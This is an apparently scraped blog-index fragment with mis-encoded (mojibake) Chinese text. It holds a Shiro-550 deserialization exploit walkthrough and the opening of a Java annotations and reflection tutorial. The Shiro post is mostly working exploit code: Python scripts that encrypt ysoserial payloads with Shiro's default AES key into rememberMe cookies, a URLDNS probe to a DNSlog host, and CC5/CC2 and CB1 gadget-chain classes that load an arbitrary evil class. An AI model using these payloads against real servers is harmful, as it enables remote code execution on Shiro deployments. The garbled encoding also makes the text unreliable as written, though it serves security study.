è§£å¯†å¯†é’¥ä¸€æ ·ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬çŸ¥é“åŠ å¯†å¯†é’¥ï¼Œå°±å¯ä»¥æ‰¾é“¾å­ã€æ„é€ rememberMeä¸ºæ¶æ„åºåˆ—åŒ–å¯¹è±¡ï¼Œåœ¨æ­¤å¤„è¿›è¡Œååºåˆ—åŒ–åˆ©ç”¨ &lt;4&gt; æ¼æ´åˆ©ç”¨åŠ å¯†è„šæœ¬ï¼š 123456789101112131415161718import base64import subprocessfrom Crypto.Cipher import AESdef rememberme(command): popen = subprocess.Popen([r'java.exeè·¯å¾„', '-jar',r'ysoserialè·¯å¾„', 'URLDNS',command],stdout=subprocess.PIPE) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot; mode = AES.MODE_CBC iv = b' ' * 16 encryptor = AES.new(base64.b64decode(key), mode, iv) file_body = pad(popen.stdout.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertextif __name__ == '__main__': payload = rememberme('http://wxafnplx.eyes.sh') print(&quot;rememberMe={}&quot;.format(payload.decode())) (1) URLDNSé“¾æ³¨æ„ å‘åŒ…æ—¶å¦‚æœç™»å½•è¿‡ï¼Œè¦æŠŠsessionidå»æ‰ å¦åˆ™ä¼šç›´æ¥è¯†åˆ«èº«ä»½ï¼Œè€Œä¸ä¼šå†å»è·å–rememberMe æ›´æ”¹åå†æ¬¡å‘åŒ…ï¼ŒDNSlogå¤„æ”¶åˆ°å“åº” (2) åˆ©ç”¨CC2å’ŒCC4æ”»å‡»(æ‰‹åŠ¨æ·»åŠ Commons-Collections 4.0ä¾èµ–)é€šè¿‡URLDNSé“¾ï¼Œæˆ‘ä»¬éªŒè¯æˆåŠŸå­˜åœ¨ååºåˆ—åŒ–æ¼æ´ çœŸæ­£è¦åˆ©ç”¨çš„è¯ï¼Œæˆ‘ä»¬è¿˜æ˜¯å¾—å»æ‰¾ä¸€äº›å¯ä»¥rceçš„é“¾å­ æˆ‘ä»¬çœ‹ä¸€ä¸‹shiroè‡ªå¸¦çš„ä¾èµ–ï¼Œå‘ç°shiroä¸­è‡ªå¸¦çš„æ˜¯cc3.2.1ç‰ˆæœ¬çš„ç»„ä»¶ æ‰€ä»¥æˆ‘ä»¬ä¼šæƒ³åˆ° å¯ä»¥åˆ©ç”¨CC6å»æ‰“ä¸€ä¸‹ï¼Œå¼¹ä¸€ä¸‹è®¡ç®—å™¨è¯•è¯• åˆ©ç”¨åŠ å¯†è„šæœ¬ + ysoserialç”ŸæˆCC6çš„payload å‘é€ å¹¶æ²¡æœ‰å¼¹å‡ºè®¡ç®—å™¨ çœ‹ä¸€ä¸‹å“ªé‡Œå‡ºé—®é¢˜äº† 1232023-07-27 19:26:43,928 WARN [org.apache.shiro.mgt.DefaultSecurityManager]: Delegate RememberMeManager instance of type [org.apache.shiro.web.mgt.CookieRememberMeManager] threw an exception during getRememberedPrincipals().org.apache.shiro.io.SerializationException: Unable to deserialze argument byte array. at org.apache.shiro.io.DefaultSerializer.deserialize(DefaultSerializer.java:82) é—®é¢˜å‘ç”Ÿåœ¨org.apache.shiro.io.DefaultSerializer.deserialize(DefaultSerializer.java:82) æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹æ˜¯ä»€ä¹ˆåŸå› ï¼šè¿™é‡Œæˆ‘ä»¬ç›´æ¥çœ‹ååºåˆ—åŒ–å‘ç”Ÿçš„ç‚¹ï¼Œç¬¬75è¡Œä½¿ç”¨äº†ClassResolvingObjectInputStreamç±»è€Œéä¼ ç»Ÿçš„ObjectInputStream shiroä¸­é‡å†™äº†ObjectInputStreamç±»çš„resolveClasså‡½æ•°ï¼ŒObjectInputStreamçš„resolveClassæ–¹æ³•ç”¨çš„æ˜¯Class.forNameç±»è·å–å½“å‰æè¿°å™¨æ‰€æŒ‡ä»£çš„ç±»çš„Classå¯¹è±¡ è€Œé‡å†™åçš„resolveClassæ–¹æ³•ï¼Œé‡‡ç”¨çš„æ˜¯ClassUtils.forName æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿï¼Ÿï¼ŸClassUtils.forNameä¸æ”¯æŒä¼ å…¥æ•°ç»„ å…·ä½“ä¸ºä»€ä¹ˆä¸æ”¯æŒä¼ å…¥æ•°ç»„å¯ä»¥å‚è€ƒï¼šhttps://blog.zsxsoft.com/post/35 å› æ­¤ä¼ å…¥ä¸€ä¸ªTransformæ•°ç»„çš„å‚æ•°ï¼Œä¼šæŠ¥é”™ è€Œcc2å’Œcc4çš„åˆ©ç”¨é“¾éƒ½æ˜¯åŸºäºjavassistå»å®ç°çš„ï¼Œè€Œä¸æ˜¯åŸºäºTransformæ•°ç»„ã€‚å› æ­¤å¯ä»¥åˆ©ç”¨ï¼Œè€Œcc2å’Œcc4éœ€è¦Commons-Collections 4.0çš„ä¾èµ– (3) æ‹¼å‡‘CCæ”»å‡»(shiroåŸç”ŸCC3.2.1åˆ©ç”¨)shiroæ˜¯ä¸è‡ªå¸¦Commons-Collections 4.0çš„ä¾èµ–çš„ï¼Œå½“ç„¶ä½ é‡åˆ°shiroçš„è¯ä¹Ÿä¸å¯èƒ½è‡ªå·±å»ç»™ä»–æ·»åŠ ä¸Šå»ï¼Œé‚£æ€ä¹ˆåŠå‘¢ï¼Ÿæ²¡æœ‰Commons-Collections 4.0çš„ç»„ä»¶å°±ä¸èƒ½rceäº†å—ï¼Ÿ å…¶å®æ–¹å¼è¿˜æ˜¯æœ‰çš„ï¼Œéœ€è¦æˆ‘ä»¬æ‹¼æ¥ä¸€ä¸‹å„ä¸ªCCé“¾ï¼Œå»é‡æ–°æ„é€ ä¸€ä¸‹åˆ©ç”¨é“¾ Transformæ•°ç»„ç”¨ä¸äº†ï¼Œå³ åˆ©ç”¨é“¾ä¸­çš„ChainedTransformerè¿™ä¸ªç±»åˆ©ç”¨ä¸äº†ï¼Œå› ä¸ºä»–çš„ç±»å±æ€§iTransformersæ˜¯æ•°ç»„ç±»å‹çš„Transformersã€‚ ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ InvokerTransformer.transform(templates) å»è§¦å‘TemplatesImpl.newTransformer è¿›è¡Œæ¶æ„ç±»åŠ è½½rce å³åˆ©ç”¨CC2çš„ååŠæ®µï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹CC2çš„è°ƒç”¨è¿‡ç¨‹ 12345678910111213PriorityQueue.readObject -&gt; PriorityQueue.heapify() -&gt; PriorityQueue.siftDown() -&gt; PriorityQueue.siftDownUsingComparator() -&gt; TransformingComparator.compare()************************************************************* -&gt; InvokerTransformer.transform() -&gt; TemplatesImpl.newTransformer() -&gt;TemplatesImpl#getTransletInstance() -&gt;TemplatesImpl#defineTransletClasses() -&gt;TransletClassLoader#defineClass() -&gt; Runtime.getRuntime().exec()************************************************************* åœ¨è¿™æ¡é“¾ä¸Šï¼Œç”±äºTransformingComparatoråœ¨Commons-Collections 3.2.1çš„ç‰ˆæœ¬ä¸Šè¿˜æ²¡æœ‰å®ç°Serializableæ¥å£ï¼Œå…¶åœ¨3.2.1ç‰ˆæœ¬ä¸‹æ˜¯æ— æ³•ååºåˆ—åŒ–çš„ã€‚æ‰€ä»¥æˆ‘ä»¬æ— æ³•ç›´æ¥åˆ©ç”¨è¯¥payloadæ¥è¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„ç›®çš„ å› æ­¤éœ€è¦æ”¹é€ ä¸€ä¸‹ï¼Œå“ªé‡Œè¿˜æœ‰åœ°æ–¹å¯ä»¥æ„é€ è°ƒç”¨åˆ° InvokerTransformer.transform() å¹¶ä¸”ä½¿ å‚æ•°ä¸ºæ„é€ å¥½çš„TemplatesImplå¯¹è±¡ã€‚ æˆ‘ä»¬æ‰¾åˆ°äº† LazyMap.get()æ–¹æ³• å…¶ä¸­mapã€factoryã€keyæˆ‘ä»¬éƒ½å¯ä»¥æ§åˆ¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°†å°†æ„é€ å¥½çš„TemplatesImplå¯¹è±¡ èµ‹å€¼ç»™keyï¼Œfactoryç»™Invokertransformerã€‚ä»è€Œä¸CC2ååŠæ®µä¸²èµ·æ¥äº†ã€‚ è‡³äº å“ªæ¡é“¾ä¸­é—´ä¼šè°ƒç”¨äº†LazyMap.get() CC1ã€CC5ã€CC6éƒ½å¯ä»¥ï¼Œå¹¶ä¸”ä»–ä»¬é€‚äº Commons-Collections 3.2.1ç»„ä»¶ï¼Œå› æ­¤å¯ä»¥æ„é€ å‡ºå¥½å‡ æ¡é“¾å­ è¿™é‡Œæ‹¿CC5å¼€åˆ€ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;import java.util.Map;public class CC5_CC2_shiroexp { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException { TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates,&quot;_name&quot;,&quot;aaa&quot;); byte[] code = Files.readAllBytes(Paths.get(&quot;evil.class&quot;)); byte[][] codes = {code}; setFieldValue(templates,&quot;_bytecodes&quot;,codes); setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl()); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;, new Class[]{}, new Object[]{}); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,invokerTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,templates);//å°†è¿™é‡Œçš„keyç”¨äº†èµ·æ¥ BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(1); Class c = badAttributeValueExpException.getClass(); Field val = c.getDeclaredField(&quot;val&quot;); val.setAccessible(true); val.set(badAttributeValueExpException,tiedMapEntry); serialize(badAttributeValueExpException); unserialize(&quot;CC5_CC2_shiroexp.bin&quot;); } public static void setFieldValue(Object object,String field_name,Object filed_value) throws NoSuchFieldException, IllegalAccessException { Class clazz=object.getClass(); Field declaredField=clazz.getDeclaredField(field_name); declaredField.setAccessible(true); declaredField.set(object,filed_value); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;CC5_CC2_shiroexp.bin&quot;)); oos.writeObject(obj); } public static Object unserialize(String filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); return ois.readObject(); }} è¿™é‡Œå’Œä¸Šé¢è¿˜ä¸åŒï¼Œè¿™é‡Œåºåˆ—åŒ–æ•°æ®å­˜å‚¨åˆ°äº† .binäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸Šé¢åˆ™æ˜¯é€šè¿‡cmd å‘½ä»¤è¿”å›ç»“æœè¿›è¡ŒåŠ å¯†ã€‚ ä¸è¿‡å¤§ä½“ä¸Šå·®ä¸å¤šï¼Œç¨å¾®ä¿®æ”¹ä¸€ä¸‹ä¹‹å‰çš„pythonåŠ å¯†è„šæœ¬ åŠ å¯†è„šæœ¬ï¼š 1234567891011121314151617181920import base64import subprocessfrom Crypto.Cipher import AESdef bin2rememberme(filepath): f = open(filepath,&quot;rb&quot;) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot; mode = AES.MODE_CBC iv = b' ' * 16 encryptor = AES.new(base64.b64decode(key), mode, iv) file_body = pad(f.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) f.close() return base64_ciphertextif __name__ == '__main__': payload = bin2rememberme(r&quot;.binæ–‡ä»¶è·¯å¾„&quot;) print(&quot;rememberMe={}&quot;.format(payload.decode())) æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ (4) åŸç”ŸCommons-Beanutils1é“¾æ”»å‡»å…¶å®shiroè‡ªå¸¦ä¾èµ–é‡Œï¼Œæˆ‘ä¹ˆä¸ä»…å¯ä»¥çœ‹åˆ° Commons-Collections 3.2.1 è¿˜å­˜åœ¨Commons-beanutils1.8.3 å¯ä»¥åˆ©ç”¨shiroè‡ªå¸¦çš„CBä¾èµ– æ‰“CBé“¾è¿›è¡Œrce 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.beanutils.BeanComparator;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class CB1 { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException { TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates,&quot;_name&quot;,&quot;aaa&quot;); byte[] code = Files.readAllBytes(Paths.get(&quot;evil.classè·¯å¾„&quot;)); byte[][] codes = {code}; setFieldValue(templates,&quot;_bytecodes&quot;,codes); setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl()); final BeanComparator comparator = new BeanComparator(); final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator); // stub data for replacement later queue.add(&quot;1&quot;); queue.add(&quot;1&quot;); setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;); setFieldValue(queue, &quot;queue&quot;, new Object[]{templates, templates}); serialize(queue); unserialize(&quot;CB-bin/CB1.bin&quot;); } public static void setFieldValue(Object object,String field_name,Object filed_value) throws NoSuchFieldException, IllegalAccessException { Class clazz=object.getClass(); Field declaredField=clazz.getDeclaredField(field_name); declaredField.setAccessible(true); declaredField.set(object,filed_value); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;CB-bin/CB1.bin&quot;)); oos.writeObject(obj); } public static Object unserialize(String filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); return ois.readObject(); }} ç”Ÿæˆæ„é€ å¥½çš„CB1é“¾çš„äºŒè¿›åˆ¶æ–‡ä»¶ååï¼Œåˆ©ç”¨åŠ å¯†è„šæœ¬ å¾—åˆ°rememberMeå­—æ®µå¯¹åº”å€¼ å‘åŒ…ï¼Œå¼¹å‡ºè®¡ç®—å™¨ æ³¨æ„ï¼š ç”¨ysoæ‰“shiroçš„CBé“¾å¯èƒ½æ‰“ä¸é€š æˆ‘ä»¬æ‰“ä¸€ä¸‹è¯•è¯• 123456789101112131415161718import base64import subprocessfrom Crypto.Cipher import AESdef rememberme(command): popen = subprocess.Popen([r'java.exe', '-jar',r'ysoserial.jar', 'CommonsCollections2',command],stdout=subprocess.PIPE) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot; mode = AES.MODE_CBC iv = b' ' * 16 encryptor = AES.new(base64.b64decode(key), mode, iv) #print(popen.stdout.read()) file_body = pad(popen.stdout.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertextif __name__ == '__main__': payload = rememberme('calc') print(&quot;rememberMe={}&quot;.format(payload.decode())) tomcatæŠ¥é”™äº† åŸå› æ˜¯åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ—¶ serialVersionUIDå®šä¹‰çš„ä¸åŒ 1Caused by: java.io.InvalidClassException: org.apache.commons.beanutils.BeanComparator; local class incompatible: stream classdesc serialVersionUID = -2044202215314119608, local class serialVersionUID = -3490850999041592962 çœŸç›¸ï¼šç‰ˆæœ¬é—®é¢˜ å› ä¸º yso ä¸­ cb ç‰ˆæœ¬ä¸º 1.9ï¼Œè€Œ shiro è‡ªå¸¦ä¸º 1.8.3 å‚è€ƒï¼šhttps://www.anquanke.com/post/id/192619#h2-3https://blog.zsxsoft.com/post/35","link":"/2023/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"title":"JavaåŸºç¡€ç¯‡-æ³¨è§£ä¸åå°„","text":"æ³¨è§£(Annotation)æ³¨è§£Annotation æ˜¯ JDK5.0 å¼•å…¥çš„ä¸€ç§æ³¨é‡Šæœºåˆ¶ Annotationçš„ä½œç”¨ï¼š ä¸æ˜¯ç¨‹åºæœ¬èº«ï¼Œå¯ä»¥å¯¹ç¨‹åºä½œå‡ºè§£é‡Š å¯ä»¥è¢«å…¶ä»–ç¨‹åº(æ¯”å¦‚ï¼šç¼–è¯‘å™¨ç­‰)è¯»å– Annotationçš„ä½œç”¨ï¼š æ³¨è§£æ˜¯ä»¥â€@æ³¨é‡Šåâ€åœ¨ä»£ç ä¸­å­˜åœ¨çš„ï¼Œè¿˜å¯ä»¥æ·»åŠ ä¸€äº›å‚æ•°å€¼ Annotationåœ¨å“ªé‡Œä½¿ç”¨ï¼Ÿ å¯ä»¥é™„åŠ åœ¨packageã€classã€methodã€fieldä¸Šï¼Œç›¸å½“äºç»™ä»–ä»¬æ·»åŠ äº†é¢å¤–çš„è¾…åŠ©ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åå°„æœºåˆ¶ç¼–ç¨‹å®ç°å¯¹è¿™äº›å…ƒæ•°æ®çš„è®¿é—® &lt;1&gt;å†…ç½®æ³¨è§£ä¸‰ä¸ªç±»å‹åœ¨ java.lang åŒ…ä¸­ @Override - å®šä¹‰åœ¨java.lang.Overrideä¸­ï¼Œæ£€æŸ¥è¯¥æ–¹æ³•æ˜¯å¦æ˜¯é‡å†™æ–¹æ³•ã€‚å¦‚æœå‘ç°å…¶çˆ¶ç±»ï¼Œæˆ–è€…æ˜¯å¼•ç”¨çš„æ¥å£ä¸­å¹¶æ²¡æœ‰è¯¥æ–¹æ³•æ—¶ï¼Œä¼šæŠ¥ç¼–è¯‘é”™è¯¯ã€‚ @Deprecated - å®šä¹‰åœ¨java.lang.Deprecatedä¸­ï¼Œåœ¨æ ‡è®°è¿‡æ—¶æ–¹æ³•ã€å±æ€§ã€ç±»ã€‚å¦‚æœä½¿ç”¨è¯¥æ–¹æ³•ï¼Œä¼šæŠ¥ç¼–è¯‘è­¦å‘Šã€‚å› ä¸ºå®ƒæ˜¯å±é™©çš„ï¼Œæˆ–è€…å­˜åœ¨æ›´å¥½çš„æ›¿ä»£æ–¹æ³• @SuppressWarnings - å®šä¹‰åœ¨java.lang.SuppressWarningsï¼ŒæŒ‡ç¤ºç¼–è¯‘å™¨å»å¿½ç•¥æ³¨è§£ä¸­å£°æ˜çš„è­¦å‘Šï¼Œç”¨æ¥æŠ‘åˆ¶ç¼–è¯‘æ—¶çš„è­¦å‘Šä¿¡æ¯ ä¸å‰ä¸¤ä¸ªæ³¨é‡Šæœ‰æ‰€ä¸åŒï¼Œä½ éœ€è¦æ·»åŠ ä¸€ä¸ªå‚æ•°æ‰èƒ½æ­£ç¡®ä½¿ç”¨ &lt;2&gt;å…ƒæ³¨è§£ å…ƒæ³¨è§£çš„ä½œç”¨å°±æ˜¯è´Ÿè´£æ³¨è§£å…¶ä»–æ³¨è§£ï¼ŒJavaå®šä¹‰äº†4ä¸ªæ ‡å‡†çš„meta-annotationç±»å‹ï¼Œä»–ä»¬è¢«ç”¨æ¥æä¾›å¯¹å…¶ä»–annotationç±»å‹ä½œè¯´æ˜ è¿™äº›ç±»å‹åœ¨ java.lang.annotation åŒ…ä¸­ï¼Œ(@Target,@Retention,@Documented,@Inherited) @Target - ç”¨äºæè¿°æ³¨è§£çš„é€‚ç”¨èŒƒå›´(å³ï¼šè¢«æè¿°çš„æ³¨è§£å¯ä»¥ç”¨åœ¨ä»€ä¹ˆåœ°æ–¹) Retention - æ ‡è¯†è¿™ä¸ªæ³¨è§£æ€ä¹ˆä¿å­˜ï¼Œæ˜¯åªåœ¨ä»£ç ä¸­ï¼Œè¿˜æ˜¯ç¼–å…¥classæ–‡ä»¶ä¸­ï¼Œæˆ–è€…æ˜¯åœ¨è¿è¡Œæ—¶å¯ä»¥é€šè¿‡åå°„è®¿é—® ç”¨äºæè¿°æ³¨è§£çš„ç”Ÿå‘½å‘¨æœŸ (SOURCE &lt; CLASS &lt; RUNTIME) Documented - è¯´æ˜è¯¥æ³¨è§£å°†åŒ…å«åœ¨ç”¨æˆ·æ–‡æ¡£(javadoc)ä¸­ Inherited - è¯´æ˜å­ç±»å¯ä»¥ç»§æ‰¿çˆ¶ç±»ä¸­çš„è¯¥æ³¨è§£ &lt;3&gt;è‡ªå®šä¹‰æ³¨è§£ä½¿ç”¨@interfaceè‡ªå®šä¹‰æ³¨è§£æ—¶ï¼Œè‡ªåŠ¨ç»§æ‰¿äº†java.lang.annotation.Annotationæ¥å£ åˆ†æï¼š @interfaceæ¥å£°æ˜ä¸€ä¸ªæ³¨è§£ï¼Œæ ¼å¼ï¼špublic @interface æ³¨è§£å{å®šä¹‰å†…å®¹}(ç±»é‡Œçš„è¯æŠŠpublicå»æ‰) å…¶ä¸­çš„æ¯ä¸€ä¸ªæ–¹æ³•å®é™…ä¸Šæ˜¯å£°æ˜äº†ä¸€ä¸ªé…ç½®å‚æ•° æ–¹æ³•çš„åç§°å°±æ˜¯å‚æ•°çš„åç§° è¿”å›å€¼ç±»å‹å°±æ˜¯å‚æ•°çš„ç±»å‹(è¿”å›å€¼åªèƒ½æ˜¯åŸºæœ¬ç±»å‹ Class,String,enum) å¯ä»¥é€šè¿‡defaultæ¥å£°æ˜å‚æ•°çš„é»˜è®¤å€¼ å¦‚æœåªæœ‰ä¸€ä¸ªå‚æ•°æˆå‘˜ï¼Œä¸€èˆ¬å‚æ•°åä¸ºvalue æ³¨è§£å…ƒç´ å¿…é¡»è¦æœ‰å€¼ï¼Œæˆ‘ä»¬å®šä¹‰æ³¨è§£å…ƒç´ æ—¶ï¼Œç»å¸¸ä½¿ç”¨ç©ºå­—ç¬¦ä¸²ï¼Œ0ä½œä¸ºé»˜è®¤å€¼ åå°„æ¦‚è¿°æ¸¸æˆåœ¨è¿è¡Œæ—¶ï¼Œå¯ä»¥å†™ä¸€æ®µä»£ç æ³¨å…¥è¿›å»ï¼Œå«ä½œhook åœ¨è¿è¡Œæ—¶å»æ”¹å˜ä»£ç é‡Œçš„æ•°æ® æ˜¯åå°„çš„ä¸€ç§ä½“ç° &lt;1&gt;åŠ¨æ€è¯­è¨€vsé™æ€è¯­è¨€åŠ¨æ€è¯­è¨€ å¯ä»¥åœ¨è¿è¡Œæ—¶æ”¹å˜å…¶ç»“æ„çš„è¯­è¨€ï¼šä¾‹å¦‚æ–°çš„å‡½æ•°ã€å¯¹è±¡ã€ç”šè‡³ä»£ç å¯ä»¥è¢«å¼•è¿›ï¼Œå·²æœ‰çš„å‡½æ•°å¯ä»¥è¢«åˆ é™¤æˆ–è€…æ˜¯å…¶ä»–ç»“æ„ä¸Šçš„å˜åŒ–ã€‚é€šä¿—ç‚¹è¯´å°±æ˜¯åœ¨è¿è¡Œæ—¶ä»£ç å¯ä»¥æ ¹æ®æŸäº›æ¡ä»¶æ”¹å˜è‡ªèº«ç»“æ„ ä¸»è¦åŠ¨æ€è¯­è¨€ï¼šobject-cã€C#ã€JavaScriptã€PHPã€Pythonç­‰ ä¾‹å¦‚ï¼šphpé‡Œå¯ä»¥eval()å‡½æ•° å°†å­—ç¬¦ä¸²å½“ä½œä»£ç æ‰§è¡Œ é™æ€è¯­è¨€ ä¸åŠ¨æ€è¯­è¨€ç›¸å¯¹åº”ï¼Œè¿è¡Œæ—¶ç»“æ„ä¸å¯å˜çš„è¯­è¨€å°±æ˜¯é™æ€è¯­è¨€ã€‚å¦‚ï¼šJavaã€Cã€C++ Javaä¸æ˜¯åŠ¨æ€è¯­è¨€ï¼Œä½†Javaå¯ä»¥ç§°ä¸ºâ€œå‡†åŠ¨æ€è¯­è¨€â€ã€‚å³Javaæœ‰ä¸€å®šçš„åŠ¨æ€æ€§ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨åå°„æœºåˆ¶è·å¾—ç±»ä¼¼åŠ¨æ€è¯­è¨€çš„ç‰¹æ€§ï¼ŒJavaè¯­è¨€çš„åŠ¨æ€æ€§è®©ç¼–ç¨‹çš„æ—¶å€™æ›´åŠ çµæ´» &lt;2&gt; Java Reflectionæ¦‚è¿° Reflection(åå°„)æ˜¯Javaæ˜¯ä¸ºåŠ¨æ€è¯­è¨€çš„å…³é”®ï¼Œåå°„æœºåˆ¶å…è®¸ç¨‹åºåœ¨æ‰§è¡ŒæœŸå€ŸåŠ©äºReflection APIå–å¾—ä»»ä½•ç±»çš„å†…éƒ¨ä¿¡æ¯ï¼Œå¹¶èƒ½ç›´æ¥æ“ä½œä»»æ„å¯¹è±¡çš„å†…éƒ¨å±æ€§åŠæ–¹æ³•ã€‚ Class c = Class.forName(â€œjava.lang.Stringâ€) åŠ è½½å®Œç±»ä¹‹åï¼Œåœ¨å †å†…å­˜çš„æ–¹æ³•åŒºä¸­å°±äº§ç”Ÿäº†ä¸€ä¸ªClassç±»å‹çš„å¯¹è±¡(ä¸€ä¸ªç±»åªæœ‰ä¸€ä¸ªClasså¯¹è±¡)ï¼Œè¿™ä¸ªå¯¹è±¡å°±åŒ…å«äº†å®Œæ•´çš„ç±»çš„ç»“æ„ä¿¡æ¯ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡å¯¹è¿™ä¸ªå¯¹è±¡çœ‹åˆ°ç±»çš„ç»“æ„ï¼Œè¿™ä¸ªå¯¹è±¡å°±åƒä¸€é¢é•œå­ï¼Œé€è¿‡è¿™ä¸ªé•œå­çœ‹åˆ°ç±»çš„ç»“æ„ï¼Œæ‰€ä»¥æˆ‘ä»¬å½¢è±¡çš„ç§°ä¹‹ä¸ºï¼šåå°„ æ­£å¸¸æ–¹å¼ï¼šå¼•å…¥éœ€è¦çš„â€åŒ…ç±»â€åç§° â€“ã€‹ é€šè¿‡newä¾‹å®è¯ â€“ã€‹å–å¾—å®ä¾‹åŒ–å¯¹è±¡ åå°„æ–¹å¼ï¼šå®ä¾‹åŒ–å¯¹è±¡ â€“ã€‹ getClass()æ–¹æ³• â€“ã€‹ å¾—åˆ°Classå¯¹è±¡ &lt;3&gt; Javaåå°„æœºåˆ¶æä¾›çš„åŠŸèƒ½ï¼š åœ¨è¿è¡Œæ—¶åˆ¤æ–­ä»»æ„ä¸€ä¸ªå¯¹è±¡æ‰€å±çš„ç±» åœ¨è¿è¡Œæ—¶æ„é€ ä»»æ„ä¸€ä¸ªç±»çš„å¯¹è±¡ åœ¨è¿è¡Œæ—¶åˆ¤æ–­ä»»æ„ä¸€ä¸ªç±»æ‰€å…·æœ‰çš„æˆå‘˜å˜é‡å’Œæ–¹æ³• åœ¨è¿è¡Œæ—¶è°ƒç”¨ä»»æ„ä¸€ä¸ªå¯¹è±¡çš„æˆå‘˜å˜é‡å’Œæ–¹æ³• åœ¨è¿è¡Œæ—¶è·å–å¹¿æ³›ä¿¡æ¯ åœ¨è¿è¡Œæ—¶å¤„ç†æ³¨è§£ ç”ŸæˆåŠ¨æ€ä»£ç† (æœºåˆ¶ AOPä¼šç”¨åˆ°) Â·Â·Â·Â·Â·Â· &lt;4&gt; Javaåå°„ä¼˜ç‚¹ä¸ç¼ºç‚¹ ä¼˜ç‚¹ï¼šå¯ä»¥å®ç°åŠ¨æ€åˆ›å»ºå¯¹è±¡ä¸ç¼–è¯‘ï¼Œä½“ç°å‡ºå¾ˆå¼ºå¤§çš„çµæ´»æ€§ ç¼ºç‚¹ï¼šå¯¹æ€§èƒ½æœ‰å½±å“ã€‚ä½¿ç”¨åå°„åŸºæœ¬ä¸Šæ˜¯ä¸€ç§è§£é‡Šæ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥å‘Šè¯‰JVMï¼Œæˆ‘ä»¬å¸Œæœ›åšä»€ä¹ˆå¹¶ä¸”å®ƒæ»¡è¶³æˆ‘ä»¬çš„è¦æ±‚ï¼Œè¿™ç±»æ“ä½œæ€»æ˜¯æ…¢äº ç›´æ¥æ‰§è¡Œç›¸åŒçš„æ“ä½œ &lt;5&gt; åå°„ç›¸å…³çš„ä¸»è¦API java.lang.Classï¼šä»£è¡¨ä¸€ä¸ªç±» java.lang.reflect.Methodï¼šä»£è¡¨ç±»çš„æ–¹æ³• java.lang.reflect.Fieldï¼šä»£è¡¨ç±»çš„æˆå‘˜å˜é‡ java.lang.reflect.Constructorï¼šä»£è¡¨ç±»çš„æ„é€ å™¨ Â·Â·Â·Â·Â·Â· &lt;6&gt; Classç±»åœ¨Objectç±»ä¸­å®šä¹‰äº†ä»¥ä¸‹çš„æ–¹æ³•ï¼Œæ­¤æ–¹æ³•å°†è¢«æ‰€æœ‰å­ç±»ç»§æ‰¿ public final Class getClass() 